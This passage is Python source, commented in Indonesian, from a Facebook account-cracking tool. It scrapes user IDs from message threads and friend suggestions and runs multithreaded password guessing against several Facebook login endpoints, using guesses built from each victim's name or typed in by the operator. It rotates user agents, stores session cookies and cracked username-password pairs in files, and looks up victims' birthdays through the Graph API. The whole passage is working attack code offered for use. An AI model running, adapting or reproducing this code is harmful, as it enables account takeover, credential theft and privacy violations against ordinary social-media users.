	def pesan(self, data_):
		try:
			bs = parser(requests.get(data_, cookies=self.kueh).text, 'html.parser')
			print(f"\r{U}{til}{O} Mengumpulkan Id {M}> {U}[{H}{len(self.id)}{U}] ",end="")
			for i in bs.find_all('a', href=True):
				if '/messages/read' in i.get('href'):
					f = bs4.re.findall('cid\\.c\\.(.*?)%3A(.*?)&', i.get('href'))
					try:
						for ip in list(f.pop()):
							if self.kueh.get(' c_user') in ip:
								continue
							else:
								if 'pengguna facebook' in i.text.lower():
									continue
								self.id.append(ip+"<=>"+i.text)
					except Exception as e:
						continue
				if 'Lihat Pesan Sebelumnya' in i.text:
					self.pesan('https://mbasic.facebook.com/' + i.get('href'))
		except:
			pass
			
	# CRACK SARAN TEMAN
	def saran(self, data_, jum):
		try:
			true = False
			respon = requests.get(data_, cookies=self.kueh).text
			otw = re.findall('\<a\ class\=\".."\ href\=\"/friends/hovercard/mbasic/\?uid=(\\d*).*?"\>(.*?)</a\>',respon)
			if len(otw)!=0:
				for i in otw:
					self.id.append(i[0]+"<=>"+i[1])
					print(f"\r{U}{til}{O} Mengumpulkan Id {M}> {U}[{H}{len(self.id)}{U}] ",end="")
					if len(self.id)==jum:
						true=True
						break
			if true==False:
				if "Lihat selengkapnya" in respon:
					self.saran(self.url+parser(respon,"html.parser").find("a",string="Lihat selengkapnya").get("href"),jum)
		except:
			pass
			
# USER AGENT
def user_agentAPI():
	ugent =["Dahttpslvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z007;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a"] 
# GANTI USER AGENT
def useragent():
	print ("\n%s[%s01%s]. Ganti user agent "%(P,H,P))
	print ("%s[%s02%s]. Cek user agent "%(P,H,P))
	print ("%s[%s00%s]. Kembali "%(P,H,P))
	__Aang__Sayang__Laura__ = input('\n%s[%s+%s] Pilih :%s '%(P,M,P,H))
	uas(__Aang__Sayang__Laura__)
	
def uas(__Aang__Sayang__Laura__):
	if __Aang__Sayang__Laura__ == '':
		print ('\n%s[%s!%s] Yang bener kontol'%(P,K,P));jeda(2)
		uas(__Aang__Sayang__Laura__)
	elif __Aang__Sayang__Laura__ in("1","01"):
		print ("%s[%s!%s] Ketik %scancel%s untuk gunakan ua dari script"%(P,H,P,H,P))
		ua = input("%s[%s!%s] User agent :%s "%(P,H,P,H))
		if ua in(""):
			print ('\n%s[%s!%s] Yang bener kontol'%(P,K,P));jeda(2)
			menu()
		elif ua in("CANCEL","Cancel","cancel"):
			ua_ = ("Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]")
			open("ua.txt","w").write(ua_);jeda(2)
			print ("\n%s[%s✓%s]  Berhasil menggunakan user agent script "%(P,H,P));jeda(2)
			pilihan().menu()
		open("ua.txt","w").write(ua);jeda(2)
		print ("\n%s[%s✓%s] Berhasil mengganti user agent"%(P,H,P));jeda(2)
		pilihan().menu()
	elif __Aang__Sayang__Laura__ in("2","02"):
		try:
			ua_ = open('ua.txt', 'r').read();jeda(2)
			print ("%s[%s+%s] User anget lu :%s%s "%(P,H,P,H,ua_));jeda(2)
			input('\n%s[%s!%s] Tekan enter '%(P,H,P))
			pilihan().menu()
		except IOError:
			ua_ = '%s-'%(M)
	elif __Aang__Sayang__Laura__ in("0","00"):
		pilihan().menu()
	else:
		print ('\n%s[%s!%s] Yang bener kontol'%(P,K,P));jeda(2)
		uas(__Aang__Sayang__Laura__)
		
# MULAI CRACK 
pwx = []
class Crack:
	
	def __init__(self):
		self.id = []
		self.url = "https://mbasic.facebook.com"
		
	def romiy(self, id):
		self.id = id
		#print ('\n%s%s%s jumlah Id%s > %s%s'%(U,til,O,M,H,len(self.id)))
		__Aang__Sayang__Laura__ = input('\n%s[%s?%s] Ingin gunakan password manual? (y/n):%s '%(P,H,P,H))
		if __Aang__Sayang__Laura__ in ('Y', 'y'):
			print ('\n%s[%s+%s] Contoh : sayang,kontol,bajingan '%(P,H,P))
			while True:
				pwx = input('%s[%s?%s] Password :%s '%(P,H,P,H))
				if pwx == '':
					print ('\n%s[%s!%s] Ndak boleh kosong bangsat '%(P,K,P));jeda(2)
				elif len(pwx)<=5:
					print ('\n%s[%s!%s] Sandi minimal 6 karakter kontol'%(P,K,P));jeda(2)
					exit()
				else:
					def manual(brute=None):
						__Aang__Sayang__Laura__ = input('\n%s[%s+%s] Pilih :%s '%(P,H,P,H))
						if __Aang__Sayang__Laura__ =='':
							print("%s[%s!%s] Yang bener kontol "%(P,H,P))
							manual()
						elif __Aang__Sayang__Laura__ in ('1', '01'):
							print ('\n%s[%s!%s] Crack sedang berjalan ... '%(P,H,P));jeda(0.2)
							print ('%s[%s+%s] Akun %sOK%s saved in : %sOK/%s.txt'%(P,M,P,H,P,H,waktu));jeda(0.2)
							print ('%s[%s+%s] Akun %sCP%s saved in : %sCP/%s.txt\n'%(P,M,P,K,P,K,waktu));jeda(0.2)
							with ThreadPoolExecutor(max_workers=30) as TitidNeverDie:
								for akun in self.id:
									try:
										_heck_ = akun.split('<=>')[0]
										TitidNeverDie.submit(self.touch, _heck_, brute)
									except: pass
							hasil(ok,cp)
						elif __Aang__Sayang__Laura__ in ('2', '02'):
							print ('\n%s[%s!%s] Crack sedang berjalan ... '%(P,H,P));jeda(0.2)
							print ('%s[%s+%s] Akun %sOK%s saved in : %sOK/%s.txt'%(P,M,P,H,P,H,waktu));jeda(0.2)
							print ('%s[%s+%s] Akun %sCP%s saved in : %sCP/%s.txt\n'%(P,M,P,K,P,K,waktu));jeda(0.2)
							with ThreadPoolExecutor(max_workers=30) as TitidNeverDie:
								for akun in self.id:
									try:
										_heck_ = akun.split('<=>')[0]
										TitidNeverDie.submit(self.basic, _heck_, brute)
									except: pass
							hasil(ok,cp)
						elif __Aang__Sayang__Laura__ in ('3', '03'):
							print ('\n%s[%s!%s] Crack sedang berjalan ... '%(P,H,P));jeda(0.2)
							print ('%s[%s+%s] Akun %sOK%s saved in : %sOK/%s.txt'%(P,M,P,H,P,H,waktu));jeda(0.2)
							print ('%s[%s+%s] Akun %sCP%s saved in : %sCP/%s.txt\n'%(P,M,P,K,P,K,waktu));jeda(0.2)
							with ThreadPoolExecutor(max_workers=30) as TitidNeverDie:
								for akun in self.id:
									try:
										_heck_ = akun.split('<=>')[0]
										TitidNeverDie.submit(self.mobil, _heck_, brute)
									except: pass
							hasil(ok,cp)
						else:
							print ('\n%s[%s!%s] Yang bener kontol'%(P,K,P));jeda(2)
							manual()
					print ('\n%s[%s+%s] Pilih methode login, silahkan coba satu² ]\n'%(P,H,P))
					print ('%s[%s01%s] Methode free (kenceng tod) '%(P,H,P))
					print ('%s[%s02%s] Methode mbasic (saran doang) '%(P,H,P))
					print ('%s[%s03%s] Methode mobile (ini lambat bego) '%(P,H,P))
					manual(pwx.split(','))
					break
		elif __Aang__Sayang__Laura__ in ('N', 'n'):
			print ('\n%s[%s+%s] Pilih methode login, silahkan coba satu² ]\n'%(P,H,P))
			print ('%s[%s1%s] Methode free (kenceng tod) '%(P,H,P))
			print ('%s[%s2%s] Methode mbasic (saran doang) '%(P,H,P))
			print ('%s[%s3%s] Methode mobile (ini lambat bego) '%(P,H,P))
			self.langsung()
		else:
			print ('\n%s[%s!%s] Yang bener kontol'%(P,K,P));jeda(2)
			pilihan().menu()
	
	# LANGSUNG
	def langsung(self):
		global pwx
		#from data import list_peweh
		__Aang__Sayang__Laura__ = input('\n%s[%s+%s] Pilih :%s '%(P,H,P,H))
		if __Aang__Sayang__Laura__ == '':
			print ('\n%s[%s!%s] Yang bener kontol'%(P,K,P));jeda(2)
			self.langsung()
		elif __Aang__Sayang__Laura__ in ('1', '01'):
			jalan ('\n%s[%s!%s] Proses crack sedang berjalan ... '%(P,H,P));jeda(0.2) 
			print ('%s[%s+%s] Akun %sOK%s saved in : %sOK/%s.txt'%(P,M,P,H,P,H,waktu));jeda(0.2)
			print ('%s[%s+%s] Akun %sCP%s saved in : %sCP/%s.txt\n'%(P,M,P,K,P,K,waktu));jeda(0.2)
            #print ('%s[%s!%s] Mode pesawat %s2 detik%s setiap %s5 menit%s ! \n'%(P,H,P,H,P,H,P))
			with ThreadPoolExecutor(max_workers=30) as TitidNeverDie:
				for akun in self.id: 
					try:
						uid, name = akun.split('<=>')
						na = name.split(' ')
						if len(na) == 1:
							pwx = [name, na[0]+na[1], na[0]+"123", na[0]+"12345"]
						elif len(na) == 2:
							pwx = [name, na[0]+na[1], na[0]+"123", na[0]+"12345"]
						elif len(na) == 3:
							pwx = [name, na[0]+na[1], na[0]+"123", na[0]+"12345"]
						elif len(na) == 4:
							pwx = [name, na[0]+na[1], na[0]+"123", na[0]+"12345"]
						else:
							pwx = [name, na[0]+na[1], na[0]+"123", na[0]+"12345"]
						TitidNeverDie.submit(self.touch, uid, pwx)
					except: pass
			hasil(ok,cp)
		elif __Aang__Sayang__Laura__ in ('2', '02'):
			jalan ('\n%s[%s!%s] Proses crack sedang berjalan ... '%(P,H,P));jeda(0.2)
			print ('%s[%s+%s] Akun %sOK%s saved in : %sOK/%s.txt'%(P,M,P,H,P,H,waktu));jeda(0.2)
			print ('%s[%s+%s] Akun %sCP%s saved in : %sCP/%s.txt\n'%(P,M,P,K,P,K,waktu));jeda(0.2)
            #print ('%s[%s!%s] Mode pesawat %s2 detik%s setiap %s5 menit%s ! \n'%(P,H,P,H,P,H,P));jeda(0.2)
			with ThreadPoolExecutor(max_workers=30) as TitidNeverDie:
				for akun in self.id: 
					try:
						uid, name = akun.split('<=>')
						na = name.split(' ')
						if len(na) == 1:
							pwx = [name, na[0]+na[1], na[0]+"123", na[0]+"12345"]
						elif len(na) == 2:
							pwx = [name, na[0]+na[1], na[0]+"123", na[0]+"12345"]
						elif len(na) == 3:
							pwx = [name, na[0]+na[1], na[0]+"123", na[0]+"12345"]
						elif len(na) == 4:
							pwx = [name, na[0]+na[1], na[0]+"123", na[0]+"12345"]
						else:
							pwx = [name, na[0]+na[1], na[0]+"123", na[0]+"12345"]
						TitidNeverDie.submit(self.basic, uid, pwx)
					except: pass
			hasil(ok,cp)
		elif __Aang__Sayang__Laura__ in ('3', '03'):
			jalan ('\n%s[%s!%s] Proses crack sedang berjalan ... '%(P,H,P));jeda(0.2)
			print ('\n%s[%s+%s] Akun %sOK%s saved in : %sOK/%s.txt'%(P,M,P,H,P,H,waktu));jeda(0.2)
			print ('%s[%s+%s] Akun %sCP%s saved in : %sCP/%s.txt\n'%(P,M,P,K,P,K,waktu));jeda(0.2)
            #print ('%s[%s!%s] Mode pesawat %s2 detik%s setiap %s5 menit%s ! \n'%(P,H,P,H,P,H,P));jeda(0.2)
			with ThreadPoolExecutor(max_workers=30) as TitidNeverDie:
				for akun in self.id: 
					try:
						uid, name = akun.split('<=>')
						na = name.split(' ')
						if len(na) == 1:
							pwx = [name, na[0]+na[1], na[0]+"123", na[0]+"12345"]
						elif len(na) == 2:
							pwx = [name, na[0]+na[1], na[0]+"123", na[0]+"12345"]
						elif len(na) == 3:
							pwx = [name, na[0]+na[1], na[0]+"123", na[0]+"12345"]
						elif len(na) == 4:
							pwx = [name, na[0]+na[1], na[0]+"123", na[0]+"12345"]
						else:
							pwx = [name, na[0]+na[1], na[0]+"123", na[0]+"12345"]
						TitidNeverDie.submit(self.mobil, uid, pwx)
					except: pass
			hasil(ok,cp)
		else:
			print ('\n%s[%s!%s] Yang bener kontol'%(P,K,P));jeda(2)
			self.langsung()
			
	# TOUCH
	def touch(self, user, manual, **data):
		global ok,cp,loop
		warna = random.choice([P, O,])
		sys.stdout.write('\r'+warna+'[#]\x1b[1;97m <--> %s/%s %sOk%s:%s%s%s %sCp%s:%s%s%s '%(loop,len(self.id),H,M,H,len(ok),O,K,M,K,len(cp),O)),
		sys.stdout.flush()
		try:
			for pw in manual:
				pw = pw.lower()
				ses = requests.Session()
				ua = random.choice(["Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]","NokiaX2-00/5.0 (08.25) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-T875 Build/RP1A.200 720.012) AppleWebKit /537.36 (KHTML, like Gecko) Version /4.0 Chrome /96.0.4664.104 Safari/537.36 GNews Android /2022034746 UNTRUSTED/1.0","Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/35.0.0.48.273;]","Mozilla/5.0 (Linux; U; Android 9; LGL722DL Build/PKQ1.190302.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/79.0.3945.116 Mobile Safari/537.36 OPR/60.0.2254.59405"])
				headers_ = {
                "Host":"free.facebook.com",
                "upgrade-insecure-requests":"1",
                "user-agent":ua,
                "accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                "dnt":"1","x-requested-with":"mark.via.gp",
                "sec-fetch-site":"same-origin",
                "sec-fetch-mode":"cors",
                "sec-fetch-user":"empty",
                "sec-fetch-dest":"document",
                "referer":"https://free.facebook.com/",
                "accept-encoding":"gzip, deflate br",
                "accept-language":"en-GB,en-US;q=0.9,en;q=0.8"
                }
				p = ses.get('https://free.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F', headers=headers_).text
				dataa = {"lsd":re.search('name="lsd" value="(.*?)"', str(p)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p)).group(1),"uid":user,"flow":"login_no_pin","pass":pw,"next":"https://developers.facebook.com/tools/debug/accesstoken/"}
				_headers = {"Host":"https://b-api.facebook.com/method/auth.","cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://free.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":"Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://free.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
				po = ses.post("https://free.facebook.com/login/device-based/validate-password/?shbl=0", data = dataa, headers=_headers, allow_redirects = False)
				if "c_user" in ses.cookies.get_dict():
					try:
						kukis=";".join([key+"="+value for key,value in ses.cookies.get_dict().items()])
						romz = open('data/token.txt', 'r').read()
						lahir = requests.get(f"https://graph.facebook.com/{user}?fields=birthday&access_token={romz}").json()['birthday']
						day, month, year = lahir.split('/')
						month = bulan12[month]
						print ('\r%s[%s•%s]%s %s|%s|%s %s %s\n | '%(P,H,P,H,user,pw,day,month,year))
						#os.popen("play-audio dapet.mp3")
						ok.append("%s ◊ %s ◊ %s %s %s ◊ %s "%(user,pw,day,month,year,kukis))
						open('OK/%s.txt' %(waktu), 'a').write(" *--> %s|%s|%s|%s|%s \n"%(user,pw,day,month,year))
						cek_apk(kukis)
						break
					except (KeyError, IOError):
						day = ''
						month = ''
						year = ''
					except:
						pass
					print ('\r %s[%s•%s]%s %s|%s\n | '%(P,H,P,H,user,pw))
					#os.popen("play-audio dapet.mp3")
					ok.append('%s ◊ %s ◊ %s'%(user,pw,kukis))
					open('OK/%s.txt'%(waktu), 'a').write(' *--> %s|%s \n'%(user,pw))
					cek_apk(kukis)
					break
				elif 'checkpoint' in ses.cookies.get_dict():
					try:
						romz = open('data/token.txt', 'r').read()
						lahir = requests.get(f"https://graph.facebook.com/{user}?fields=birthday&access_token={romz}").json()['birthday']
						day, month, year = lahir.split('/')
						month = bulan12[month]
						print ('\r %s[%s•%s]%s %s|%s|%s %s %s\n |  '%(P,K,P,K,user,pw,day,month,year))
						#os.popen("play-audio dapet.mp3")
						cp.append("%s ◊ %s ◊ %s %s %s"%(user,pw,day,month,year))
						open('CP/%s.txt' %(waktu), 'a').write(" *--> %s|%s|%s|%s|%s\n"%(user,pw,day,month,year))
						break
					except (KeyError, IOError):
						day = ''
						month = ''
						year = ''
					except:
						pass
					print ('\r %s[%s•%s]%s %s|%s\n |           '%(P,K,P,K,user,pw))
					#os.popen("play-audio dapet.mp3")
					cp.append('%s ◊ %s'%(user,pw))
					open('CP/%s.txt' %(waktu), 'a').write(" *--> %s|%s\n"%(user,pw))
					break
				else:
					continue
			loop += 1
		except requests.exceptions.ConnectionError:
			jeda(1)
			loop += 1
			self.touch(user, manual, **data)
			
	# MBASIC
	def basic(self, user, manual,**data):
		global ok,cp,loop
		warna = random.choice([P, O,])
		sys.stdout.write('\r'+warna+'[#]\x1b[1;97m <--> %s/%s %sOk%s:%s%s%s %sCp%s:%s%s%s '%(loop,len(self.id),H,M,H,len(ok),O,K,M,K,len(cp),O)),
		sys.stdout.flush()
		try:
			for pw in manual:
				pw = pw.lower()
				ses = requests.Session()
				ua = random.choice(["Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]","NokiaX2-00/5.0 (08.25) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-T875 Build/RP1A.200 720.012) AppleWebKit /537.36 (KHTML, like Gecko) Version /4.0 Chrome /96.0.4664.104 Safari/537.36 GNews Android /2022034746 UNTRUSTED/1.0","Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/35.0.0.48.273;]","Mozilla/5.0 (Linux; U; Android 9; LGL722DL Build/PKQ1.190302.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/79.0.3945.116 Mobile Safari/537.36 OPR/60.0.2254.59405"])
				headers_ = {
                "Host":"mbasic.facebook.com",
                "upgrade-insecure-requests":"1",
                "user-agent":ua,
                "accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                "dnt":"1",
                "x-requested-with":"mark.via.gp",
                "sec-fetch-site":"same-origin",
                "sec-fetch-mode":"cors",
                "sec-fetch-user":"empty",
                "sec-fetch-dest":"document",
                "referer":"https://mbasic.facebook.com/",
                "accept-encoding":"gzip, deflate br",
                "accept-language":"en-GB,en-US;q=0.9,en;q=0.8"
                }
				p = ses.get('https://mbasic.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F', headers=headers_).text
				dataa = {"lsd":re.search('name="lsd" value="(.*?)"', str(p)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p)).group(1),"uid":user,"flow":"login_no_pin","pass":pw,"next":"https://developers.facebook.com/tools/debug/accesstoken/"}
				_headers = {"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://mbasic.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://mbasic.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
				po = ses.post("https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0", data = dataa, headers=_headers, allow_redirects = False)
				if 'c_user' in ses.cookies.get_dict():
					try:
						kukis=";".join([key+"="+value for key,value in ses.cookies.get_dict().items()])
						romz = open('data/token.txt', 'r').read()
						lahir = requests.get(f"https://graph.facebook.com/{user}?fields=birthday&access_token={romz}").json()['birthday']
						day, month, year = lahir.split('/')
						month = bulan12[month]
						print ('\r%s[%s•%s]%s %s|%s|%s %s %s\n | '%(P,H,P,H,user,pw,day,month,year))
					    #os.system("xdg-open play-audio terminal.mp3")
						ok.append("%s ◊ %s ◊ %s %s %s ◊ %s "%(user,pw,day,month,year,kukis))
						open('OK/%s.txt' %(waktu), 'a').write(" *--> %s|%s|%s|%s|%s  \n"%(user,pw,day,month,year))
						cek_apk(kukis)
						break
					except (KeyError, IOError):
						day = ''
						month = ''
						year = ''
					except:
						pass
					print ('\r%s[%s•%s]%s %s|%s\n | '%(P,H,P,H,user,pw))
					#os.popen("play-audio terminal.mp3")
					ok.append('%s ◊ %s ◊ %s'%(user,pw,kukis))
					open('OK/%s.txt'%(waktu), 'a').write(' *--> %s|%s\n'%(user,pw))
					cek_apk(kukis)
					break
				elif 'checkpoint' in ses.cookies.get_dict():
					try:
						romz = open('data/token.txt', 'r').read()
						lahir = requests.get(f"https://graph.facebook.com/{user}?fields=birthday&access_token={romz}").json()['birthday']
						day, month, year = lahir.split('/')
						month = bulan12[month]
						print ('\r%s[%s•%s]%s %s|%s|%s %s %s\n | '%(P,K,P,K,user,pw,day,month,year))
						#os.system("play-audio dapet.mp3")
						cp.append("%s ◊ %s ◊ %s %s %s"%(user,pw,day,month,year))
						open('CP/%s.txt' %(waktu), 'a').write(" *--> %s|%s|%s|%s %s\n"%(user,pw,day,month,year))
						break
					except (KeyError, IOError):
						day = ''
						month = ''
						year = ''
					except:
						pass
					print ('\r%s[%s•%s]%s %s|%s\n |          '%(P,K,P,K,user,pw))
					#os.popen("play-audio dapet.mp3")
					cp.append('%s ◊ %s'%(user,pw))
					open('CP/%s.txt' %(waktu), 'a').write(" *--> %s|%s\n"%(user,pw))
					break
				else:
					continue
			loop += 1
		except requests.exceptions.ConnectionError:
			jeda(1)
			loop += 1
			self.basic(user, manual, **data)
	
	# MOBILE
	def mobil(self, user, manual,**data):
		global ok,cp,loop
		warna = random.choice([P, O,])
		sys.stdout.write('\r'+warna+'[#]\x1b[1;97m <--> %s/%s %sOk%s:%s%s%s %sCp%s:%s%s%s '%(loop,len(self.id),H,M,H,len(ok),O,K,M,K,len(cp),O)),
		sys.stdout.flush()
		try:
			for pw in manual:
				pw = pw.lower()
				ses = requests.Session()
				ua = random.choice(["Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]","NokiaX2-00/5.0 (08.25) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-T875 Build/RP1A.200 720.012) AppleWebKit /537.36 (KHTML, like Gecko) Version /4.0 Chrome /96.0.4664.104 Safari/537.36 GNews Android /2022034746 UNTRUSTED/1.0","Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/35.0.0.48.273;]","Mozilla/5.0 (Linux; U; Android 9; LGL722DL Build/PKQ1.190302.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/79.0.3945.116 Mobile Safari/537.36 OPR/60.0.2254.59405"])
				headers_ = {
                "Host":"m.facebook.com",
                "upgrade-insecure-requests":"1",
                "user-agent":ua,
                "accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                "dnt":"1","x-requested-with":"mark.via.gp",
                "sec-fetch-site":"same-origin",
                "sec-fetch-mode":"cors",
                "sec-fetch-user":"empty",
                "sec-fetch-dest":"document",
                "referer":"https://m.facebook.com/",
                "accept-encoding":"gzip, deflate br",
                "accept-language":"en-GB,en-US;q=0.9,en;q=0.8"
                }
				p = ses.get('https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F', headers=headers_).text
				dataa = {"lsd":re.search('name="lsd" value="(.*?)"', str(p)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p)).group(1),"uid":user,"flow":"login_no_pin","pass":pw,"next":"https://developers.facebook.com/tools/debug/accesstoken/"}
				_headers = {"Host":"m.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://m.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":"Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
				po = ses.post("https://m.facebook.com/login/device-based/validate-password/?shbl=0", data = dataa, headers=_headers, allow_redirects = False)
				if 'c_user' in ses.cookies.get_dict():
					try:
						kukis=";".join([key+"="+value for key,value in ses.cookies.get_dict().items()])
						romz = open('data/token.txt', 'r').read()
						lahir = requests.get(f"https://graph.facebook.com/{user}?fields=birthday&access_token={romz}").json()['birthday']
						day, month, year = lahir.split('/')
						month = bulan12[month]
						print ('\r%s[%s•%s]%s %s|%s|%s %s %s\n | '%(P,H,P,H,user,pw,day,month,year))
						#os.popen("play-audio dapet.mp3")
						ok.append("%s ◊ %s ◊ %s %s %s ◊ %s "%(user,pw,day,month,year,kukis))
						open('OK/%s.txt' %(waktu), 'a').write(" *--> %s|%s|%s|%s|%s\n"%(user,pw,day,month,year))
						cek_apk(kukis)
						break
					except (KeyError, IOError):
						day = ''
						month = ''
						year = ''
					except:
						pass
					print ('\r%s[%s•%s]%s %s|%s\n | '%(P,H,P,H,user,pw))
					#os.popen("play-audio dapet.mp3")
					ok.append('%s ◊ %s ◊ %s'%(user,pw,kukis))
					open('OK/%s.txt'%(waktu), 'a').write(' *--> %s|%s \n'%(user,pw))
					cek_apk(kukis)
					break
				elif 'checkpoint' in ses.cookies.get_dict():
					try:
						romz = open('data/token.txt', 'r').read()
						lahir = requests.get(f"https://graph.facebook.com/{user}?fields=birthday&access_token={romz}").json()['birthday']
						day, month, year = lahir.split('/')
						month = bulan12[month]
						print ('\r%s[%s•%s]%s %s|%s|%s %s %s\n |  '%(P,K,P,K,user,pw,day,month,year))
						#os.popen("play-audio dapet.mp3")
						cp.append("%s ◊ %s ◊ %s %s %s"%(user,pw,day,month,year))
						open('CP/%s.txt' %(waktu), 'a').write(" *--> %s|%s|%s|%s|%s\n"%(user,pw,day,month,year))
						break
					except (KeyError, IOError):
						day = ''
						month = ''
						year = ''
					except:
						pass
					print ('\r%s[%s•%s]%s %s|%s\n |           '%(P,K,P,K,user,pw))
					#os.popen("play-audio dapet.mp3")
					cp.append('%s ◊ %s'%(user,pw))
					open('CP/%s.txt' %(waktu), 'a').write(" *--> %s|%s\n"%(user,pw))
					break
				else:
					continue
			loop += 1
		except requests.exceptions.ConnectionError:
			jeda(1)
			loop += 1
			self.mobil(user, manual, **data)

# SELESAI CRACK
ubah_pass = []
pwbaru = []
pwBaru = []
ubahP = []

def hasil(ok,cp):
	#os.popen('play-audio data/selesai.mp3')
	if len(ok) != 0 or len(cp) != 0:
		print("\n\n%s[%s√%s] Crack selesai sayang :v "%(P,H,P))
		print('%s[%s#%s] %s------------------------------------------------>'%(P,H,P,M));jeda(1)
